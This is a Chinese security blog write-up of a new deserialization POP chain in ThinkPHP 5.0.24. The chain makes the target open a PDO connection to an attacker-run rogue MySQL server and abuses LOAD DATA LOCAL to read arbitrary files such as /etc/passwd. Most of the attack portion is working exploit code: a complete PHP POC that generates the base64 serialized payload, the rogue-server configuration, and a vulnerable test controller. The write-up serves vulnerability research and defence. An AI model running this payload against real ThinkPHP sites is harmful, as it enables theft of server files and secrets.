# TP5.0.24反序列化链扩展-任意文件读取

阅读量 **224040**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-05-06 16:00:51

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01d9a2f9ef10c35051.png)

在学习 [TP5.0.24 反序列化漏洞](https://www.anquanke.com/post/id/196364)
时，发现了一个可控数据库连接从而实现任意文件读取的链子，原理类似这篇文章：[ThinkPHP v3.2.*
（SQL注入&文件读取）反序列化POP链](https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA)

本文将会根据自己挖掘的思路来写，尽量把调用流程展示清楚，把坑点说明下。并补充些审计时的思考。

## 跳板

**开始的入口跳板和写shell的反序列化入口是一样的，若已经知道这个链子了可以跳过**

全局搜索 `function __desctruct()` 函数，找到
`thinkphp/library/think/process/pipes/Windows.php` 文件：

    
    
    public function __destruct()
    {
        $this->close();
        $this->removeFiles();
    }
    

跟进 `$this->removeFiles()`:

    
    
    private function removeFiles()
    {
        //循环 $this->files，该值可控
        foreach ($this->files as $filename) {
            //调用 file_exists 函数检测 $filename
            //file_exists 需要传入一个 String 类型
            //若此时我们控制 $filename 为一个类，类被当作字符串使用，将会自动调用 __toString() 魔术方法
            if (file_exists($filename)) {
                @unlink($filename);
            }
        }
        $this->files = [];
    }
    

**这里有一个小 trick** ：挖反序列化的时候，我们可以控制 `传参类型为String的函数` 传入一个类，使程序自动调用
`__toString()`，达到跳板的目的。

全局搜索 `function __toString()`，找到 `thinkphp/library/think/Model.php`文件：

    
    
    public function __toString()
    {
        return $this->toJson();
    }
    

一直跟进，最后调用了 `Model.php` 的 `toArray()` 方法

**以上都是和网上流传的写shell的链子是一致的，往下的链子就不一样了**

## 漏洞点

挖掘一个新链子时，我一般使用的方法是：

  1. 先整体粗看，梳理调用链，找到最终可以实现我们需求的函数。在这个阶段 **不需要太纠结** 数据如何传递的，我们只需要找到最终函数即可。
  2. 回溯函数，细看调用链中的每个函数，思考如何 **控制程序流程** 执行到最终函数

**ps：**  
 _最终函数其实就是能够执行到我们想要的操作，或者对程序有危害操作的函数，可能是一个注入点，也可能是一个上传点。_

###  整体梳理

这里整理了个简单的流程图，代码进行了简化。在梳理阶段我们只需要关注函数能调用哪里即可，不需要对每个函数的流程控制进行详细分析。
**确定可能存在的函数调用链** 即可。

整个流程的核心为：

  1. 数据库连接可控
  2. 程序执行过程中会执行SQL语句

![](https://p4.ssl.qhimg.com/t01640de1e990f4f78e.png)

**解决图中的 问题1**  
我们能传入的 `type` 仅限于下图这几个tp5 自带的数据库驱动类

![](https://p3.ssl.qhimg.com/t019647e6f3f383c1c5.png)

**解决图中的 问题2**  
在 `think/Model.php buildQuery()` 中，有个任意类实例化的代码:

    
    
    $con = Db::connect($connection);
    $queryClass = $this->query ?: $con->getConfig('query');
    //实例化任意类
    $query      = new $queryClass($con, $this);
    

在上图中我们选择了实例化 `think\db\Query.php`。

选择实例化这个类，是因为 `think/Model.php buildQuery()` 最终会 `return` 到 `think/Model.php
getPk()`函数，该函数代码如下：

    
    
    //$this->getQuery() 就是 buildQuery() 的返回值
    //为了能够链式操作调用getPk()，需要找到一个具有getPk()方法的类
    //便选择了think\db\Query类
    $this->pk = $this->getQuery()->getPk();
    

为了程序能够顺利执行，我们选择实例化的类 **必须存在`getPk()` 方法**。不然将会触发 `__call()`
，使程序流程走到意外的分支。全局搜索了 `getPk()` 方法后找到 `think\db\Query.php` 较为合适。

###  回溯细看

在`toArray()` 方法中，我们仅需要控制一个 `$this->append`即可

    
    
    think/Model.php
    public function toArray()
    {
        ......
        //反序列中$this->append可控
        if (!empty($this->append)) {
            foreach ($this->append as $key => $name) {
                //$this->append值不能为数组
                if (is_array($name)) {
                      ......
                }
                //$this->append值不能有.
                elseif (strpos($name, '.')) {
                    .....
                } else {
                    //去除 $this->append键中特殊字符
                    $relation = Loader::parseName($name, 1, false);
                    //$this->append的键必须是本类存在的方法名
                    if (method_exists($this, $relation)) {
                        //任意本类方法调用
                        $modelRelation = $this->$relation();
                        ....
                    } 
                }
            }
        }
    }
    

`save()`方法中，经过一大段并不会影响程序流程的代码后，最终调用了 `$this->getPk()`

    
    
    think/Model.php
    public function save($data = [], $where = [], $sequence = null)
    {
        if (is_string($data)) {
            .....
        }
        if (!empty($data)) {
            .....
        }
        if (!empty($where)) {
          .....
        }
        if (!empty($this->relationWrite)) {
           ......
        }
        if (false === $this->trigger('before_write', $this)) {
            .....
        }
        //经过一堆无关紧要的操作，可调用$this->getPk()
        $pk = $this->getPk();
    }
    

前文调用 `getPk()` 是无参调用

    
    
    think/Model.php
    public function getPk($name = '')
    {
        if (!empty($name)) {
            .....
        }
        //由于调用时是无参调用
        //必会进入elseif
        elseif (empty($this->pk)) {
            $this->pk = $this->getQuery()->getPk();
        }
    }
    

此时进行了链式操作，我们先看 `getQuery()` 方法。我们可以留意下该方法的返回值。

    
    
    think/Model.php
    public function getQuery($buildNewQuery = false)
    {
        if ($buildNewQuery) {
            return $this->buildQuery();
        } 
        //无参调用，$this->class可控
        //我们可控制为一个不存在的值让程序流程必定进入elseif
        elseif (!isset(self::$links[$this->class])) {
            self::$links[$this->class] = $this->buildQuery();
        }
        //返回$this->buildQuery()返回的东西
        return self::$links[$this->class];
    }
    

**下面的说明可能有点绕，可以根据下文给出的测试POC自行跟进下将比较好理解。**

**TP数据库配置 – getQuery()**

在 `buildQuery()` 中，进行数据库的初始化连接操作。但仅仅只是进行了配置，并没有真正的进行数据库连接。

这一段由于没有太多需要控制流程的地方，我们主要工作是明确如何设置各个变量的值。

这一段代码解析配合上文的流程图食用效果更佳

    
    
    think/Model.php
    protected function buildQuery()
    {
        .....
        //控制$this->connection
        //通过查看Db::connect()方法
        //可以得知$this->connection内容就是数据库配置
        $connection = $this->connection;
        $con = Db::connect($connection);
    
        //$this->query可控，控制程序实例化Query类
        $queryClass = $this->query ?: $con->getConfig('query');
        $query      = new $queryClass($con, $this);
        return $query;
    }
    ===========
    think/Db.php
    public static function connect($config = [], $name = false)
    {
        //解析配置
        $options = self::parseConfig($config);
    
        //加载数据库驱动
        $class = false !== strpos($options['type'], '\\') ?
            $options['type'] :
        '\\think\\db\\connector\\' . ucwords($options['type']);
    
        //实例化数据库驱动
        //查看Mysql数据库驱动类构造方法可以得知
        //Mysql->config成员变量被赋值为$options
        self::$instance[$name] = new $class($options);
    
        return self::$instance[$name];
    }
    ===========
    think/db/Connection.php 所有数据库驱动都继承此类
    public function __construct(array $config = [])
    {
        if (!empty($config)) {
            $this->config = array_merge($this->config, $config);
        }
    }
    ===========
    think/db/Query.php
    public function __construct(Connection $connection = null, $model = null)
    {
        //为 Query->connection 成员变量赋值
        //值为buildQuery()中调用的 Db::connect()，可控
        $this->connection = $connection ?: Db::connect([], true);
    
        //下面的操作主要是实例化了数据库驱动的Builder类
        //对我们的攻击无关紧要。感兴趣也可以跟进下
        $this->prefix     = $this->connection->getConfig('prefix');
        $this->model      = $model;
        $this->setBuilder();
    }
    

经过上面这段 `TP数据库配置操作` 后，在 `buildQuery()` 中将会返回 `Query类` 的实例。

**TP数据库执行 – getPk()**

在该方法中对数据库进行PDO连接。具体的连接函数在下文分析。这里我们先了解调用流程

    
    
    think/db/Connection.php
    public function getPk($options = '')
    {
        $pk = $this->getTableInfo(is_array($options) ? $options['table'] : $options, 'pk');
    }
    ========
    think/db/Connection.php
    public function getTableInfo($tableName = '', $fetch = '')
    {
        $db = $this->getConfig('database');
        if (!isset(self::$info[$db . '.' . $guid])) {
            //前面的不太重要，一般都能调用到这里
            $info = $this->connection->getFields($guid);
        }
    }
    ========
    think/db/connector/Mysql.php
    public function getFields($tableName)
    {
        //sql语句
        $sql = 'SHOW COLUMNS FROM ' . $tableName;
        //调用query()
        $pdo = $this->query($sql, [], false, true);
    }
    ========
    think/db/Connection.php
    public function query($sql, $bind = [], $master = false, $pdo = false)
    {
        //数据库连接配置
        //这里会在下文详细说
        $this->initConnect($master);
        $this->PDOStatement = $this->linkID->prepare($sql);
        $this->PDOStatement->execute();
    }
    

**测试POC**

这里给出个POC，如果没看懂的话跟着POC开Debug走一走流程就明白调用过程了 = =

_备注：该POC运行到`think/db/Connection.php connect()` 将会由于没有传入正确数据库配置而报错停止运行。这里我们
**明白调用流程** 即可_

    
    
    <?php
    namespace think{
        abstract class Model{
            //toArray()中
            //为了使得能够进入if判断并foreach
            //需要控制该成员变量
            //值为被调用的任意本类方法，即save()
            protected $append = [
                'save'
            ];
            protected $table = 'xxx';
            //buildQuery()中
            //为了能够实例化Query类
            //需要控制该成员变量
            protected $query = '\think\db\Query';
        }
    }
    
    namespace think\model{
        //继承抽象类 Model
        class Pivot extends \think\Model{
        }
    }
    
    namespace think\process\pipes{
        class Windows{
            private $files = [];
            public function __construct(){
                //!!!!
                //由于Model类是抽象类，我们只能实例化其子类
                //!!!!
                $this->files[] = new \think\model\Pivot();
            }        
        }
    }
    namespace{
        //入口点 __destruct()
        $a = new \think\process\pipes\Windows();
        echo base64_encode(serialize($a));
    }
    ?>
    

###  控制数据库配置

由于上文的POC在 `think/db/Connection.php
connect()`就抛出错误了。查看该方法，发现其进行了PDO连接数据库的操作，传入的配置为其成员变量。

这里值得注意的是，由于数据库驱动类是另外 `new`
出来的，所以反序列化无法直接控制其成员变量。我们只能通过给构造函数传参，在构造函数中控制部分成员变量。具体可看前文的流程图会清晰一些。

    
    
    //数据库配置格式
    //我们要构造的payload就按照这个数组来写
    protected $config = [
        'type'            => '',
        'hostname'        => '',
        'database'        => '',
        'username'        => '',
        'password'        => '',
        'hostport'        => '',
        ......
    ];
    
    //PDO配置
    protected $params = [
        PDO::ATTR_CASE              => PDO::CASE_NATURAL,
        PDO::ATTR_ERRMODE           => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_ORACLE_NULLS      => PDO::NULL_NATURAL,
        PDO::ATTR_STRINGIFY_FETCHES => false,
        //该PDO配置将使得 LOAD DATA LOCAL 不成功
        //需要在connect()中将之覆写为true 
        PDO::ATTR_EMULATE_PREPARES  => false,
    ];
    
    public function connect(array $config = [], $linkNum = 0, $autoConnection = false)
    {
            $config = array_merge($this->config, $config);
    
            //控制$config['params']不为空且为数组，使程序进入if判读
            //覆写该类默认的$this->params[PDO::ATTR_EMULATE_PREPARES] 为true
            //这样我们 LOAD DATA LOCAL 才能成功
            if (isset($config['params']) && is_array($config['params'])) {
                $params = $config['params'] + $this->params;
            } else {
                $params = $this->params;
            }
            if (empty($config['dsn'])) {
                $config['dsn'] = $this->parseDsn($config);
            }
            $this->links[$linkNum] = new PDO($config['dsn'], $config['username'], $config['password'], $params);
        }
        return $this->links[$linkNum];
    }
    

**扩展** ：使用 `+` 拼接数组，后面的数组不会覆盖前面的数组值。但是使用 `array_merge` 将会覆盖前面的值：

    
    
    <?php
    $a = [
        'x' => 1
    ];
    $b = [
        'x' => 2,
        'v' => 3
    ];
    //使用 + 拼接数组
    //$c['x'] 还是1
    $c = $a+$b;
    //使用 array_merge 拼接数组
    //$d['x'] 被覆盖为2
    $d = array_merge($a,$b);
    ?>
    

根据上文的代码分析。我们可构建连接恶意Mysql数据库的配置。这里需要注意几点：

  1. ``PDO::MYSQL_ATTR_LOCAL_INFILE` 要设置为 **true** 。不然PDO无法进行 `LOAD DATA LOCAL` 操作
  2. `PDO::ATTR_EMULATE_PREPARES` 也要设置为 **true** 。不然`LOAD DATA LOCAL`会报错
  3. PDO连接恶意Mysql数据库 **不需要** 正确的用户名密码和库名。只要地址正确即可

初始化PDO连接后，`connect()` 将把PDO连接返回到 `query()`函数中，由这个函数执行 `PDOStatement execute()`

## 最终POC

搭建的恶意Mysql服务器选择 [Rogue-MySql-Server](https://github.com/Gifts/Rogue-MySql-Server)。可以通过编辑其 `rogue_mysql_server.py` 修改服务监听端口和被读取的文件：

    
    
    PORT = 3306
    .....
    filelist = (
        '/etc/passwd',
    )
    

修改POC，增加数据库配置：

    
    
    <?php
    
    namespace think{
        abstract class Model{
            protected $append = [
                'save'
            ];
            protected $table = 'xxx';
            protected $query = '\think\db\Query';
    
            //buildQuery()中
            //为Db::connect()传入的数据库连接配置
            protected $connection = [
                // 数据库类型
                'type'            => 'mysql',
                // 服务器地址
                'hostname'        => '127.0.0.1',
                // 数据库名
                'database'        => 'xxx',
                // 用户名
                'username'        => 'xxx',
                // 密码
                'password'        => 'xxx',
                'params' => [
                    //让PDO能够执行LOAD DATA LOCAL
                    \PDO::MYSQL_ATTR_LOCAL_INFILE => true,
                    //重写配置，让PDO LOAD DATA LOCAL不报错
                    \PDO::ATTR_EMULATE_PREPARES  => true,
                ]
            ];
        }
    }
    
    namespace think\model{
        class Pivot extends \think\Model{
        }
    }
    
    namespace think\process\pipes{
        class Windows{
            private $files = [];
            public function __construct(){
                $this->files[] = new \think\model\Pivot();
            }        
        }
    }
    namespace{
        $a = new \think\process\pipes\Windows();
        echo base64_encode(serialize($a));
    }
    ?>
    

在TP的控制器处新建一个 `index.php`。写入如下测试代码：

    
    
    <?php
    namespace app\index\controller;
    
    class Index
    {
        public function index()
        {
           $a = base64_decode('生成的POC');
           unserialize($a);
        }
    }
    

开启Rogue Mysql：

    
    
    python rogue_mysql_server.py
    

访问测试文件，发现报了个错

![](https://p2.ssl.qhimg.com/t01ac8e8aab2064959a.png)

查看日志，成功读取文件

![](https://p4.ssl.qhimg.com/t01e8ceb2def9aea0c7.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Xiaopan233** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/239242](/post/id/239242)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [反序列化](/tag/反序列化)
  * [ThinkPHP](/tag/ThinkPHP)
  * [Thinkphp5](/tag/Thinkphp5)
  * [TP5.0.24](/tag/TP5.0.24)
  * [TP5](/tag/TP5)

 **+1** __4赞

 __收藏

![](https://p4.ssl.qhimg.com/t01383ec18329fe95d0.png) Xiaopan233

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

